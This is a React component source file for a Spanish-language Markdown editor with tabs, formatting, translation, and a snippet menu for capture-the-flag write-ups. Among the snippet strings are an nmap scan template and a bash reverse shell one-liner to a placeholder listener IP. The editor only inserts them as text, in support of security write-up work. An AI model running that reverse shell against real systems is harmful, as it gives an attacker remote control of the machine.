import React, { useRef, useState, useEffect } from 'react';
import {
  Bold,
  Italic,
  Heading1,
  Heading2,
  List,
  ListOrdered,
  Quote,
  Code,
  Table,
  Link2,
  Minus,
  Upload,
  FileCode,
  Trash2,
  CheckSquare,
  Image as ImageIcon,
  Plus,
  FilePlus,
  X,
  Edit2,
  Check,
  FileText,
  Sparkles,
  Wand2,
  Loader2,
  Shield,
  Flag,
  Terminal,
  ChevronDown,
  Bookmark,
  Languages,
  Maximize2,
  Minimize2,
} from 'lucide-react';
import { DocumentTab } from '../types';
import { formatMarkdown } from '../utils/markdownFormatter';
import { translateMarkdown } from '../utils/markdownTranslator';

interface MarkdownEditorProps {
  markdown: string;
  onChange: (value: string) => void;
  onFileUpload: (file: File) => void;
  onClear: () => void;
  lastSaved?: Date | null;
  onOpenImageModal?: () => void;
  onNotify?: (msg: string) => void;
  isZenMode?: boolean;
  onToggleZenMode?: () => void;
  // Multi-tab properties
  tabs?: DocumentTab[];
  activeTabId?: string;
  onSelectTab?: (id: string) => void;
  onAddTab?: () => void;
  onLoadFileIntoNewTab?: (file: File) => void;
  onUpdateTabTitle?: (id: string, newTitle: string) => void;
  onRemoveTab?: (id: string) => void;
}

export const MarkdownEditor: React.FC<MarkdownEditorProps> = ({
  markdown,
  onChange,
  onFileUpload,
  onClear,
  lastSaved,
  onOpenImageModal,
  onNotify,
  isZenMode = false,
  onToggleZenMode,
  tabs = [],
  activeTabId = '',
  onSelectTab,
  onAddTab,
  onLoadFileIntoNewTab,
  onUpdateTabTitle,
  onRemoveTab,
}) => {
  const fileInputRef = useRef<HTMLInputElement>(null);
  const newTabFileInputRef = useRef<HTMLInputElement>(null);
  const textareaRef = useRef<HTMLTextAreaElement>(null);
  const [isDragging, setIsDragging] = useState(false);

  // Editing state for tab title
  const [editingTabId, setEditingTabId] = useState<string | null>(null);
  const [editingTitleText, setEditingTitleText] = useState('');

  // Beautifier / formatting state
  const [isFormatting, setIsFormatting] = useState(false);
  const [formatSuccess, setFormatSuccess] = useState(false);

  // Snippets & Callouts dropdown state
  const [isSnippetsOpen, setIsSnippetsOpen] = useState(false);
  const snippetsDropdownRef = useRef<HTMLDivElement>(null);

  // Close snippets dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (
        snippetsDropdownRef.current &&
        !snippetsDropdownRef.current.contains(event.target as Node)
      ) {
        setIsSnippetsOpen(false);
      }
    };
    if (isSnippetsOpen) {
      document.addEventListener('mousedown', handleClickOutside);
    }
    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
    };
  }, [isSnippetsOpen]);

  // Statistics
  const wordsCount = markdown.trim() ? markdown.trim().split(/\s+/).length : 0;
  const charsCount = markdown.length;
  const linesCount = markdown.split('\n').length;
  const readTimeMin = Math.max(1, Math.ceil(wordsCount / 200));

  const handleFormatMarkdown = async () => {
    if (!markdown || !markdown.trim()) {
      onNotify?.('No hay contenido para formatear en esta pestaña.');
      return;
    }

    setIsFormatting(true);
    try {
      const res = await formatMarkdown(markdown);
      if (res.error) {
        onNotify?.(`Error al formatear: ${res.error}`);
      } else if (res.changed) {
        onChange(res.formatted);
        setFormatSuccess(true);
        setTimeout(() => setFormatSuccess(false), 2200);
        onNotify?.('Markdown formateado con éxito (listas, sangrías y espaciado estandarizados).');
      } else {
        setFormatSuccess(true);
        setTimeout(() => setFormatSuccess(false), 2200);
        onNotify?.('El Markdown ya cuenta con un formato óptimo.');
      }
    } catch {
      onNotify?.('Error inesperado al formatear el Markdown.');
    } finally {
      setIsFormatting(false);
    }
  };

  // Offline Translator state
  const [isTranslating, setIsTranslating] = useState(false);
  const [translateSuccess, setTranslateSuccess] = useState(false);

  const handleTranslateOffline = async () => {
    if (!markdown || !markdown.trim()) {
      onNotify?.('No hay contenido para traducir en esta pestaña.');
      return;
    }

    setIsTranslating(true);
    try {
      const result = await translateMarkdown(markdown, { onStatus: (message) => onNotify?.(message) });
      onChange(result.translated);
      setTranslateSuccess(true);
      setTimeout(() => setTranslateSuccess(false), 2200);
      onNotify?.(
        result.engine === 'browser'
          ? `Traducido al español con el traductor local del navegador (${result.stats.codeBlocksPreserved} bloques de código preservados).`
          : `Traducción parcial por diccionario (títulos y frases técnicas). Para traducción completa usa Chrome 138+ de escritorio.`
      );
    } catch (err) {
      console.error('Error translating:', err);
      onNotify?.('Error al procesar la traducción.');
    } finally {
      setIsTranslating(false);
    }
  };

  const insertSnippetAtCursor = (snippet: string) => {
    const textarea = textareaRef.current;
    if (!textarea) {
      onChange(markdown + snippet);
      return;
    }

    const start = textarea.selectionStart;
    const end = textarea.selectionEnd;
    const newMarkdown =
      markdown.substring(0, start) + snippet + markdown.substring(end);

    onChange(newMarkdown);

    setTimeout(() => {
      textarea.focus();
      textarea.setSelectionRange(start + snippet.length, start + snippet.length);
    }, 0);
  };

  const insertText = (before: string, after: string = '', placeholder: string = '') => {
    const textarea = textareaRef.current;
    if (!textarea) return;

    const start = textarea.selectionStart;
    const end = textarea.selectionEnd;
    const selected = markdown.substring(start, end);
    const content = selected || placeholder;
    const replacement = `${before}${content}${after}`;

    const newMarkdown =
      markdown.substring(0, start) + replacement + markdown.substring(end);

    onChange(newMarkdown);

    setTimeout(() => {
      textarea.focus();
      textarea.setSelectionRange(
        start + before.length,
        start + before.length + content.length
      );
    }, 0);
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(true);
  };

  const handleDragLeave = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);

    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
      const file = e.dataTransfer.files[0];

      // If user dropped an image file, convert to base64 and insert directly
      if (file.type.startsWith('image/')) {
        const reader = new FileReader();
        reader.onload = (loadEvt) => {
          const base64Data = loadEvt.target?.result as string;
          if (base64Data) {
            const cleanName = file.name.replace(/\.[^.]+$/, '');
            const imageMarkdown = `\n\n![${cleanName}](${base64Data})\n*Figura: ${cleanName}*\n\n`;
            insertSnippetAtCursor(imageMarkdown);
            onNotify?.(`Imagen "${file.name}" insertada en la posición del cursor.`);
          }
        };
        reader.readAsDataURL(file);
        return;
      }

      // If holding shift, or multiple files, or normal drop
      if (e.shiftKey && onLoadFileIntoNewTab) {
        onLoadFileIntoNewTab(file);
        onNotify?.(`Archivo cargado en una nueva pestaña.`);
      } else {
        onFileUpload(file);
      }
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      onFileUpload(e.target.files[0]);
      e.target.value = ''; // Reset input
    }
  };

  const handleNewTabFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      onLoadFileIntoNewTab?.(e.target.files[0]);
      e.target.value = ''; // Reset input
    }
  };

  const startEditingTab = (tab: DocumentTab) => {
    setEditingTabId(tab.id);
    setEditingTitleText(tab.title);
  };

  const saveEditingTab = () => {
    if (editingTabId && editingTitleText.trim()) {
      onUpdateTabTitle?.(editingTabId, editingTitleText.trim());
    }
    setEditingTabId(null);
  };

  return (
    <div
      className={`h-full flex flex-col bg-white border-r border-slate-200 transition-colors ${
        isDragging ? 'bg-indigo-50/50 ring-2 ring-indigo-500 ring-inset' : ''
      }`}
      onDragOver={handleDragOver}
      onDragLeave={handleDragLeave}
      onDrop={handleDrop}
    >
      {/* Hidden File Inputs */}
      <input
        ref={fileInputRef}
        type="file"
        accept=".md,.markdown,.txt,.pdf,text/markdown,text/plain,application/pdf"
        onChange={handleFileChange}
        className="hidden"
      />

      <input
        ref={newTabFileInputRef}
        type="file"
        accept=".md,.markdown,.txt,.pdf,text/markdown,text/plain,application/pdf"
        onChange={handleNewTabFileChange}
        className="hidden"
      />

      {/* 1. Multi-Tab Navigation Bar in Editor */}
      {tabs.length > 0 && (
        <div className="border-b border-slate-200 bg-slate-100/90 px-3 pt-2 pb-0 flex items-center justify-between gap-2 shrink-0 overflow-x-auto scrollbar-none">
          <div className="flex items-center gap-1 min-w-0 overflow-x-auto py-0.5">
            {tabs.map((tab) => {
              const isActive = tab.id === activeTabId;
              const isEditing = editingTabId === tab.id;

              return (
                <div
                  key={tab.id}
                  className={`group relative flex items-center gap-1.5 px-3 py-1.5 rounded-t-lg border-t border-l border-r text-xs transition-all select-none shrink-0 cursor-pointer ${
                    isActive
                      ? 'bg-white border-slate-200 text-indigo-700 font-semibold shadow-2xs -mb-px pb-2'
                      : 'bg-slate-200/60 hover:bg-slate-200 border-transparent text-slate-600 font-medium'
                  }`}
                  onClick={() => !isEditing && onSelectTab?.(tab.id)}
                  title={isActive ? 'Pestaña activa (doble clic para renombrar)' : `Cambiar a pestaña: ${tab.title}`}
                  onDoubleClick={() => startEditingTab(tab)}
                >
                  <FileText className={`w-3.5 h-3.5 shrink-0 ${isActive ? 'text-indigo-600' : 'text-slate-400'}`} />

                  {isEditing ? (
                    <div className="flex items-center gap-1" onClick={(e) => e.stopPropagation()}>
                      <input
                        type="text"
                        value={editingTitleText}
                        onChange={(e) => setEditingTitleText(e.target.value)}
                        onKeyDown={(e) => {
                          if (e.key === 'Enter') saveEditingTab();
                          if (e.key === 'Escape') setEditingTabId(null);
                        }}
                        onBlur={saveEditingTab}
                        autoFocus
                        className="bg-white border border-indigo-400 rounded px-1.5 py-0.5 text-xs text-slate-900 outline-none w-28 font-normal"
                      />
                      <button
                        type="button"
                        onClick={saveEditingTab}
                        className="p-0.5 text-emerald-600 hover:text-emerald-700"
                        title="Guardar título"
                      >
                        <Check className="w-3 h-3" />
                      </button>
                    </div>
                  ) : (
                    <span className="truncate max-w-[130px] sm:max-w-[180px]">{tab.title}</span>
                  )}

                  {!isEditing && (
                    <div className="flex items-center gap-0.5 ml-1">
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          startEditingTab(tab);
                        }}
                        className="opacity-0 group-hover:opacity-100 p-0.5 rounded hover:bg-slate-200/80 text-slate-400 hover:text-slate-700 transition-opacity"
                        title="Renombrar pestaña"
                      >
                        <Edit2 className="w-2.5 h-2.5" />
                      </button>

                      {tabs.length > 1 && (
                        <button
                          type="button"
                          onClick={(e) => {
                            e.stopPropagation();
                            if (window.confirm(`¿Eliminar la pestaña "${tab.title}"?`)) {
                              onRemoveTab?.(tab.id);
                            }
                          }}
                          className="opacity-0 group-hover:opacity-100 p-0.5 rounded hover:bg-rose-100 text-slate-400 hover:text-rose-600 transition-opacity"
                          title="Cerrar pestaña"
                        >
                          <X className="w-3 h-3" />
                        </button>
                      )}
                    </div>
                  )}
                </div>
              );
            })}

            {/* Quick Actions to Add Tab or Load MD as New Tab */}
            <div className="flex items-center gap-1 pl-1 shrink-0 pb-1">
              <button
                type="button"
                onClick={onAddTab}
                className="p-1.5 rounded-md text-slate-600 hover:text-indigo-600 hover:bg-white/80 border border-transparent hover:border-slate-200 transition-colors flex items-center gap-1 text-xs font-medium"
                title="Añadir nueva pestaña en blanco"
              >
                <Plus className="w-3.5 h-3.5" />
                <span className="hidden xl:inline">Nueva Pestaña</span>
              </button>

              <button
                type="button"
                onClick={() => newTabFileInputRef.current?.click()}
                className="px-2 py-1 rounded-md text-indigo-700 bg-indigo-50/80 hover:bg-indigo-100 border border-indigo-200 transition-colors flex items-center gap-1 text-xs font-medium"
                title="Cargar un archivo .md o .pdf como nueva pestaña del menú"
              >
                <FilePlus className="w-3.5 h-3.5 text-indigo-600" />
                <span>Cargar .md en pestaña</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Editor Sub-header & Action Bar */}
      <div className="border-b border-slate-200 bg-slate-50/80 px-4 py-2 flex flex-wrap items-center justify-between gap-2 shrink-0">
        <div className="flex items-center gap-2">
          <span className="text-xs font-semibold text-slate-700 uppercase tracking-wider">
            {tabs.length > 1 ? `Contenido de: ${tabs.find((t) => t.id === activeTabId)?.title || 'Pestaña'}` : 'Markdown Fuente'}
          </span>
          <button
            type="button"
            onClick={() => fileInputRef.current?.click()}
            className="text-xs font-medium text-slate-700 hover:text-indigo-700 bg-white hover:bg-slate-50 border border-slate-200 px-2.5 py-1 rounded-md transition-colors flex items-center gap-1 shadow-2xs"
            title="Sustituir contenido de esta pestaña con un fichero .md o .pdf"
          >
            <Upload className="w-3 h-3 text-slate-500" />
            <span>Reemplazar con .md</span>
          </button>
        </div>

        <div className="flex items-center gap-1.5">
          <button
            type="button"
            onClick={handleFormatMarkdown}
            disabled={isFormatting}
            className={`text-xs font-medium px-2.5 py-1 rounded-md transition-all flex items-center gap-1.5 shadow-2xs border ${
              formatSuccess
                ? 'bg-emerald-50 text-emerald-700 border-emerald-300'
                : 'bg-indigo-50/90 hover:bg-indigo-100 text-indigo-700 border-indigo-200'
            } ${isFormatting ? 'opacity-70 cursor-wait' : ''}`}
            title="Formatear Markdown (Shift+Alt+F) — Embellece y estandariza sangrías, listas, tablas y espaciado automáticamente con Prettier"
          >
            {isFormatting ? (
              <Loader2 className="w-3.5 h-3.5 animate-spin text-indigo-600" />
            ) : formatSuccess ? (
              <Check className="w-3.5 h-3.5 text-emerald-600" />
            ) : (
              <Sparkles className="w-3.5 h-3.5 text-indigo-600" />
            )}
            <span>{formatSuccess ? '¡Formateado!' : 'Formatear'}</span>
          </button>

          <button
            type="button"
            onClick={handleTranslateOffline}
            disabled={isTranslating}
            className={`text-xs font-medium px-2.5 py-1 rounded-md transition-all flex items-center gap-1.5 shadow-2xs border ${
              translateSuccess
                ? 'bg-emerald-50 text-emerald-700 border-emerald-300'
                : 'bg-white hover:bg-slate-50 text-slate-700 hover:text-indigo-700 border-slate-200'
            } ${isTranslating ? 'opacity-70 cursor-wait' : ''}`}
            title="Traducir Markdown de Inglés a Español de forma local (sin APIs externas): usa el traductor integrado del navegador si está disponible (Chrome 138+) o, si no, un diccionario de frases técnicas. Preserva intactos códigos, comandos, URLs y sintaxis."
          >
            {isTranslating ? (
              <Loader2 className="w-3.5 h-3.5 animate-spin text-indigo-600" />
            ) : translateSuccess ? (
              <Check className="w-3.5 h-3.5 text-emerald-600" />
            ) : (
              <Languages className="w-3.5 h-3.5 text-slate-500" />
            )}
            <span>{translateSuccess ? '¡Traducido!' : 'Traducir ES'}</span>
          </button>

          {onToggleZenMode && (
            <button
              type="button"
              onClick={onToggleZenMode}
              className={`text-xs p-1.5 rounded transition-colors flex items-center gap-1 ${
                isZenMode
                  ? 'bg-indigo-600 text-white font-medium shadow-xs'
                  : 'text-slate-500 hover:text-indigo-600 hover:bg-slate-200/60'
              }`}
              title={
                isZenMode
                  ? 'Salir del Modo Zen (Esc o Alt+Z)'
                  : 'Modo Zen (Alt+Z) — Pantalla completa y enfoque libre de distracciones'
              }
            >
              {isZenMode ? (
                <>
                  <Minimize2 className="w-3.5 h-3.5" />
                  <span className="text-[11px] font-semibold hidden sm:inline">Salir Zen</span>
                </>
              ) : (
                <>
                  <Maximize2 className="w-3.5 h-3.5" />
                  <span className="text-[11px] font-medium hidden sm:inline">Modo Zen</span>
                </>
              )}
            </button>
          )}

          <button
            type="button"
            onClick={onClear}
            className="text-xs text-slate-400 hover:text-rose-600 p-1.5 rounded hover:bg-slate-200/60 transition-colors"
            title="Vaciar contenido de esta pestaña"
          >
            <Trash2 className="w-3.5 h-3.5" />
          </button>
        </div>
      </div>

      {/* Formatting Toolbar */}
      <div className="border-b border-slate-100 bg-white px-3 py-1.5 flex items-center gap-0.5 shrink-0 relative z-20 overflow-visible flex-wrap">
        <button
          type="button"
          onClick={() => insertText('**', '**', 'negrita')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Negrita"
        >
          <Bold className="w-3.5 h-3.5" />
        </button>
        <button
          type="button"
          onClick={() => insertText('*', '*', 'cursiva')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Cursiva"
        >
          <Italic className="w-3.5 h-3.5" />
        </button>

        <span className="w-px h-4 bg-slate-200 mx-1" />

        <button
          type="button"
          onClick={() => insertText('# ', '', 'Encabezado 1')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Título H1"
        >
          <Heading1 className="w-3.5 h-3.5" />
        </button>
        <button
          type="button"
          onClick={() => insertText('## ', '', 'Encabezado 2')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Subtítulo H2"
        >
          <Heading2 className="w-3.5 h-3.5" />
        </button>

        <span className="w-px h-4 bg-slate-200 mx-1" />

        <button
          type="button"
          onClick={() => insertText('- ', '', 'Elemento de lista')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Lista con viñetas"
        >
          <List className="w-3.5 h-3.5" />
        </button>
        <button
          type="button"
          onClick={() => insertText('1. ', '', 'Primer elemento')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Lista numerada"
        >
          <ListOrdered className="w-3.5 h-3.5" />
        </button>
        <button
          type="button"
          onClick={() => insertText('- [ ] ', '', 'Tarea pendiente')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Lista de tareas"
        >
          <CheckSquare className="w-3.5 h-3.5" />
        </button>

        <span className="w-px h-4 bg-slate-200 mx-1" />

        <button
          type="button"
          onClick={() => insertText('> ', '', 'Cita o nota destacada')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Cita"
        >
          <Quote className="w-3.5 h-3.5" />
        </button>
        <button
          type="button"
          onClick={() => insertText('```typescript\n', '\n```', '// Código')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Bloque de código"
        >
          <Code className="w-3.5 h-3.5" />
        </button>
        <button
          type="button"
          onClick={() =>
            insertText(
              '| Columna 1 | Columna 2 | Columna 3 |\n| :--- | :--- | :--- |\n| Dato A | Dato B | Dato C |\n'
            )
          }
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Tabla de datos"
        >
          <Table className="w-3.5 h-3.5" />
        </button>
        <button
          type="button"
          onClick={() => insertText('[Texto del enlace](', ')', 'https://ejemplo.com')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Enlace"
        >
          <Link2 className="w-3.5 h-3.5" />
        </button>
        <button
          type="button"
          onClick={onOpenImageModal}
          className="p-1.5 text-indigo-600 hover:text-indigo-800 hover:bg-indigo-50 rounded transition-colors flex items-center gap-1 font-medium text-xs ml-1"
          title="Insertar imagen con tamaño y posición"
        >
          <ImageIcon className="w-3.5 h-3.5" />
          <span className="text-[11px] font-semibold">Imagen</span>
        </button>
        <button
          type="button"
          onClick={() => insertSnippetAtCursor('\n\n---\n\n')}
          className="p-1.5 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded transition-colors"
          title="Línea divisoria horizontal"
        >
          <Minus className="w-3.5 h-3.5" />
        </button>

        {/* Snippets & Callouts Dropdown */}
        <div className="relative" ref={snippetsDropdownRef}>
          <button
            type="button"
            onClick={() => setIsSnippetsOpen((prev) => !prev)}
            className={`p-1.5 rounded transition-all flex items-center gap-1 font-medium text-xs border ${
              isSnippetsOpen
                ? 'bg-indigo-100 text-indigo-900 border-indigo-300 ring-2 ring-indigo-200/60'
                : 'text-indigo-600 hover:text-indigo-800 hover:bg-indigo-50 border-transparent'
            }`}
            title="Insertar Callouts (Alertas tipo GitHub) y Snippets de CTF / Seguridad"
          >
            <Shield className="w-3.5 h-3.5 text-indigo-600" />
            <span className="text-[11px] font-semibold">Snippets & Alertas</span>
            <ChevronDown
              className={`w-3 h-3 text-indigo-600 transition-transform duration-150 ${
                isSnippetsOpen ? 'rotate-180' : ''
              }`}
            />
          </button>

          {isSnippetsOpen && (
            <div
              className="absolute left-0 top-full mt-1.5 w-80 bg-white rounded-xl shadow-2xl border border-slate-200 py-2 z-50 text-xs animate-in fade-in zoom-in-95 duration-150 max-h-[420px] overflow-y-auto ring-1 ring-black/5"
            >
              <div className="px-3 py-1 text-[10px] font-bold text-slate-400 uppercase tracking-wider flex items-center justify-between">
                <span>Callouts / Alertas Markdown</span>
                <span className="text-[9px] text-slate-400 font-normal">Estilo GitHub</span>
              </div>
              <button
                type="button"
                className="w-full text-left px-3 py-2 hover:bg-indigo-50/60 flex items-center gap-2.5 text-slate-700 transition-colors"
                onClick={() => {
                  insertSnippetAtCursor('\n\n> [!NOTE]\n> Información o apunte relevante aquí.\n\n');
                  setIsSnippetsOpen(false);
                  onNotify?.('Callout [!NOTE] insertado');
                }}
              >
                <span className="w-2.5 h-2.5 rounded-full bg-blue-500 shrink-0" />
                <div className="flex flex-col">
                  <span className="font-semibold text-slate-800">Nota ([!NOTE])</span>
                  <span className="text-[10px] text-slate-500">Información o apuntes destacados</span>
                </div>
              </button>
              <button
                type="button"
                className="w-full text-left px-3 py-2 hover:bg-indigo-50/60 flex items-center gap-2.5 text-slate-700 transition-colors"
                onClick={() => {
                  insertSnippetAtCursor('\n\n> [!TIP]\n> Consejo técnico o atajo de resolución.\n\n');
                  setIsSnippetsOpen(false);
                  onNotify?.('Callout [!TIP] insertado');
                }}
              >
                <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 shrink-0" />
                <div className="flex flex-col">
                  <span className="font-semibold text-slate-800">Consejo ([!TIP])</span>
                  <span className="text-[10px] text-slate-500">Recomendaciones o atajos prácticos</span>
                </div>
              </button>
              <button
                type="button"
                className="w-full text-left px-3 py-2 hover:bg-indigo-50/60 flex items-center gap-2.5 text-slate-700 transition-colors"
                onClick={() => {
                  insertSnippetAtCursor('\n\n> [!WARNING]\n> Precaución con filtros WAF o reglas IDS.\n\n');
                  setIsSnippetsOpen(false);
                  onNotify?.('Callout [!WARNING] insertado');
                }}
              >
                <span className="w-2.5 h-2.5 rounded-full bg-amber-500 shrink-0" />
                <div className="flex flex-col">
                  <span className="font-semibold text-slate-800">Advertencia ([!WARNING])</span>
                  <span className="text-[10px] text-slate-500">Precauciones, WAF o mitigaciones</span>
                </div>
              </button>
              <button
                type="button"
                className="w-full text-left px-3 py-2 hover:bg-indigo-50/60 flex items-center gap-2.5 text-slate-700 transition-colors"
                onClick={() => {
                  insertSnippetAtCursor('\n\n> [!DANGER]\n> Riesgo crítico de corrupción o detección.\n\n');
                  setIsSnippetsOpen(false);
                  onNotify?.('Callout [!DANGER] insertado');
                }}
              >
                <span className="w-2.5 h-2.5 rounded-full bg-rose-500 shrink-0" />
                <div className="flex flex-col">
                  <span className="font-semibold text-slate-800">Peligro ([!DANGER])</span>
                  <span className="text-[10px] text-slate-500">Riesgos críticos y precauciones severas</span>
                </div>
              </button>
              <button
                type="button"
                className="w-full text-left px-3 py-2 hover:bg-purple-50 flex items-center gap-2.5 text-purple-700 transition-colors"
                onClick={() => {
                  insertSnippetAtCursor('\n\n> [!FLAG]\n> **Flag Capturada:** `FLAG{c7f_gh0st_r34d_2026}`\n\n');
                  setIsSnippetsOpen(false);
                  onNotify?.('Callout [!FLAG] insertado');
                }}
              >
                <Flag className="w-3.5 h-3.5 text-purple-600 shrink-0" />
                <div className="flex flex-col">
                  <span className="font-semibold text-purple-900">Reto CTF / Flag ([!FLAG])</span>
                  <span className="text-[10px] text-purple-600">Marcador de bandera o exploit en writeups</span>
                </div>
              </button>

              <div className="border-t border-slate-100 my-1.5" />

              <div className="px-3 py-1 text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                Snippets CTF & Ciberseguridad
              </div>
              <button
                type="button"
                className="w-full text-left px-3 py-2 hover:bg-slate-50 flex items-center gap-2.5 text-slate-700 font-mono text-[11px] transition-colors"
                onClick={() => {
                  insertSnippetAtCursor(
                    '\n\n```bash\n# Escaneo Nmap de reconocimiento inicial\nnmap -p- --open -sS --min-rate 5000 -n -Pn <IP> -oG nmap_all.txt\nnmap -p 22,80,443 -sC -sV <IP> -oN nmap_detailed.txt\n```\n\n'
                  );
                  setIsSnippetsOpen(false);
                  onNotify?.('Snippet Nmap insertado');
                }}
              >
                <Terminal className="w-3.5 h-3.5 text-slate-600 shrink-0" />
                <div className="flex flex-col">
                  <span className="font-sans font-semibold text-slate-800 text-xs">Escaneo Nmap Completo</span>
                  <span className="text-[10px] text-slate-500 font-mono">nmap -p- --open -sS ...</span>
                </div>
              </button>
              <button
                type="button"
                className="w-full text-left px-3 py-2 hover:bg-slate-50 flex items-center gap-2.5 text-slate-700 font-mono text-[11px] transition-colors"
                onClick={() => {
                  insertSnippetAtCursor(
                    '\n\n```bash\n# Reverse Shell en Bash (Target ➔ Listener)\nbash -i >& /dev/tcp/10.10.14.X/4444 0>&1\n```\n\n'
                  );
                  setIsSnippetsOpen(false);
                  onNotify?.('Reverse Shell Bash insertado');
                }}
              >
                <Terminal className="w-3.5 h-3.5 text-rose-600 shrink-0" />
                <div className="flex flex-col">
                  <span className="font-sans font-semibold text-slate-800 text-xs">Reverse Shell Bash</span>
                  <span className="text-[10px] text-slate-500 font-mono">bash -i &gt;&amp; /dev/tcp/...</span>
                </div>
              </button>
              <button
                type="button"
                className="w-full text-left px-3 py-2 hover:bg-slate-50 flex items-center gap-2.5 text-slate-700 text-[11px] transition-colors"
                onClick={() => {
                  insertSnippetAtCursor(
                    '\n\n| Parámetro | Detalle de la Máquina |\n| :--- | :--- |\n| **Nombre** | TargetMachine |\n| **Dirección IP** | `10.10.11.X` |\n| **Sistema Operativo** | Linux / Windows |\n| **Dificultad** | Media (Medium) |\n| **Vectores Clave** | RCE ➔ Reverse Shell ➔ Root |\n\n'
                  );
                  setIsSnippetsOpen(false);
                  onNotify?.('Ficha técnica CTF insertada');
                }}
              >
                <Table className="w-3.5 h-3.5 text-indigo-600 shrink-0" />
                <div className="flex flex-col">
                  <span className="font-sans font-semibold text-slate-800 text-xs">Ficha Técnica Máquina CTF</span>
                  <span className="text-[10px] text-slate-500">Tabla resumen de IP, SO, dificultad y vectores</span>
                </div>
              </button>

              <div className="border-t border-slate-100 my-1.5" />

              <div className="px-3 py-1 text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                Marcadores de Estado Rápido
              </div>
              <div className="px-3 py-1.5 flex items-center gap-1.5 flex-wrap">
                <button
                  type="button"
                  className="px-2.5 py-1 rounded bg-emerald-50 text-emerald-700 font-mono text-[11px] hover:bg-emerald-100 border border-emerald-200 transition-colors font-medium"
                  onClick={() => {
                    insertSnippetAtCursor('`[+] Explotado con éxito:` ');
                    setIsSnippetsOpen(false);
                    onNotify?.('Marcador [+] insertado');
                  }}
                  title="Insertar marcador [+]"
                >
                  [+] Éxito
                </button>
                <button
                  type="button"
                  className="px-2.5 py-1 rounded bg-rose-50 text-rose-700 font-mono text-[11px] hover:bg-rose-100 border border-rose-200 transition-colors font-medium"
                  onClick={() => {
                    insertSnippetAtCursor('`[-] Fallo / Bloqueado:` ');
                    setIsSnippetsOpen(false);
                    onNotify?.('Marcador [-] insertado');
                  }}
                  title="Insertar marcador [-]"
                >
                  [-] Fallo
                </button>
                <button
                  type="button"
                  className="px-2.5 py-1 rounded bg-sky-50 text-sky-700 font-mono text-[11px] hover:bg-sky-100 border border-sky-200 transition-colors font-medium"
                  onClick={() => {
                    insertSnippetAtCursor('`[*] Reconocimiento:` ');
                    setIsSnippetsOpen(false);
                    onNotify?.('Marcador [*] insertado');
                  }}
                  title="Insertar marcador [*]"
                >
                  [*] Info
                </button>
                <button
                  type="button"
                  className="px-2.5 py-1 rounded bg-amber-50 text-amber-700 font-mono text-[11px] hover:bg-amber-100 border border-amber-200 transition-colors font-medium"
                  onClick={() => {
                    insertSnippetAtCursor('`[!] Alerta:` ');
                    setIsSnippetsOpen(false);
                    onNotify?.('Marcador [!] insertado');
                  }}
                  title="Insertar marcador [!]"
                >
                  [!] Alerta
                </button>
              </div>
            </div>
          )}
        </div>

        <span className="w-px h-4 bg-slate-200 mx-1" />

        <button
          type="button"
          onClick={handleFormatMarkdown}
          disabled={isFormatting}
          className={`p-1.5 rounded transition-colors flex items-center gap-1.5 text-xs ${
            formatSuccess
              ? 'text-emerald-700 bg-emerald-50 font-semibold'
              : 'text-indigo-700 hover:text-indigo-900 hover:bg-indigo-50 font-medium'
          } ${isFormatting ? 'opacity-70 cursor-wait' : ''}`}
          title="Formatear Markdown (Shift+Alt+F) — Embellecer y normalizar sangrías, listas y espaciado"
        >
          {isFormatting ? (
            <Loader2 className="w-3.5 h-3.5 animate-spin text-indigo-600" />
          ) : (
            <Wand2 className="w-3.5 h-3.5 text-indigo-600" />
          )}
          <span className="text-[11px] hidden sm:inline">Formatear</span>
        </button>
      </div>

      {/* Main Textarea Area (Centered with spacious margin in Zen Mode) */}
      <div
        className={`flex-1 relative flex flex-col min-h-0 ${
          isZenMode ? 'bg-[#0f172a]/2 items-center overflow-y-auto' : 'bg-white'
        }`}
      >
        <div
          className={`h-full flex flex-col transition-all duration-200 ${
            isZenMode
              ? 'w-full max-w-4xl px-8 sm:px-16 py-8 bg-white shadow-xl my-4 rounded-2xl border border-slate-200/80 min-h-[92vh]'
              : 'w-full'
          }`}
        >
          <textarea
            ref={textareaRef}
            value={markdown}
            onChange={(e) => onChange(e.target.value)}
            onKeyDown={(e) => {
              // Shift + Alt + F (universal VS Code format document shortcut)
              if (e.shiftKey && e.altKey && e.key.toLowerCase() === 'f') {
                e.preventDefault();
                handleFormatMarkdown();
              }
              // Escape exits Zen mode
              if (e.key === 'Escape' && isZenMode && onToggleZenMode) {
                e.preventDefault();
                onToggleZenMode();
              }
            }}
